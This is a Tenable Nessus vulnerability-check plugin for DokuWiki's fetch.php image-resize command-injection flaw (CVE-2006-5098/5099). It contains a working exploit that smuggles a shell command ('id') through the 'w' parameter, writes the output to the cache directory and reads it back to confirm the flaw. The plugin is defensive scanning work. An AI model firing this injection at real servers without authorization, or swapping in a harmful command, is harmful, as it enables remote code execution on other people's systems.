#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(22475);
  script_version("$Revision: 1.18 $");
 script_cvs_date("$Date: 2015/09/24 21:08:38 $");

  script_cve_id("CVE-2006-5098", "CVE-2006-5099");
  script_bugtraq_id(20257);
  script_osvdb_id(29288, 29289);

  script_name(english:"DokuWiki fetch.php Multiple Parameter imconvert Function Arbitrary Command Execution");
  script_summary(english:"Executes arbitrary command via DokuWiki im_convert Feature");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by
multiple vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The remote host is running DokuWiki, an open source wiki application
written in PHP.

The installed version of DokuWiki fails to properly sanitize input to
the 'w' and 'h' parameters of the 'lib/exe/fetch.php' script before
using it to execute a command when resizing images.  An
unauthenticated attacker can leverage this issue to execute arbitrary
code on the remote host subject to the privileges of the web server
user id.

In addition, the application reportedly does not limit the size of
images when resizing them, which can be exploited to churn through CPU
cycles and disk space on the affected host.

Note that successful exploitation of this issue requires that
DokuWiki's 'imconvert' configuration option be set; by default, it is
not." );
 script_set_attribute(attribute:"see_also", value:"http://bugs.splitbrain.org/?do=details&id=924");
 script_set_attribute(attribute:"see_also", value:"http://bugs.splitbrain.org/?do=details&id=926" );
 script_set_attribute(attribute:"see_also", value:"http://www.freelists.org/archives/dokuwiki/09-2006/msg00278.html" );
 script_set_attribute(attribute:"solution", value:"Upgrade to DokuWiki release 2006-03-09e / 2006-09-28 or later.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"vuln_publication_date", value:"2006/09/26");
 script_set_attribute(attribute:"plugin_publication_date", value:"2006/09/29");

script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value:"cpe:/a:andreas_gohr:dokuwiki");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();


  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2015 Tenable Network Security, Inc.");

  script_dependencies("dokuwiki_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/dokuwiki");
  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:80, php:1);


# Test an install.
i = get_install_from_kb(appname: "dokuwiki", port: port, exit_on_fail: 1);
dir = i['dir'];

  # Try to exploit the flaw to run a command.
  cmd = "id";
  fname = string(SCRIPT_NAME, "-", unixtime(), ".html");
  u = string(
      dir, "/lib/exe/fetch.php?",
      "media=wiki:dokuwiki-128.png&",
      "w=1;", cmd, ">../../data/cache/", fname, ";exit;"
    );
  r = http_send_recv3(port:port, method: "GET", item: u, exit_on_fail: 1);

  # If it looks like the exploit was successful...
  if (" bad permissions?" >< r[2])
  {
    # Retrieve the output of the command.
    u = string(dir, "/data/cache/", fname);
    r = http_send_recv3(port: port, method: "GET", item: u, exit_on_fail: 1);

    # There's a problem if the output looks like it's from id.
    if (egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string: r[2]))
    {
      if (report_verbosity)
        report = strcat('\nNessus was able to execute the command \'', cmd,
	'\' on the remote host\n',
	'which produced the following output :\n\n',
          r[2]    );
      else report = NULL;

      security_hole(port:port, extra: report);
      exit(0);
    }
  }
